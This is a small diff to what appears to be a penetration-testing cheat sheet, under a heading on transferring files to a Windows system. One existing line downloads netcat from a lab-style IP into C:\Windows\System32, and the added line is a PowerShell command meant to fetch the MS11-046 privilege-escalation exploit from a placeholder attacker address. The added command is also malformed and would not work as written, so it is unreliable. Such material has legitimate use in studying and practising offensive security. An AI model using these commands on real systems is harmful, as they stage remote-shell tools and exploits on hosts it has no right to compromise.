@@ -109,6 +109,7 @@ https://github.com/s0wr0b1ndef/
 Windows transfer file to other system
 ==================================================================================================
 iwr -uri http://10.10.14.120:8080/nc.exe -o 'C:\Windows\System32\nc.exe'
+powershell → powershell -c "(new-object System.Net.WebClient('http://<your-ip-address>:8888/MS11–046.exe', 'c:\Users\Public\Downloads')"
 ==================================================================================================
 
 
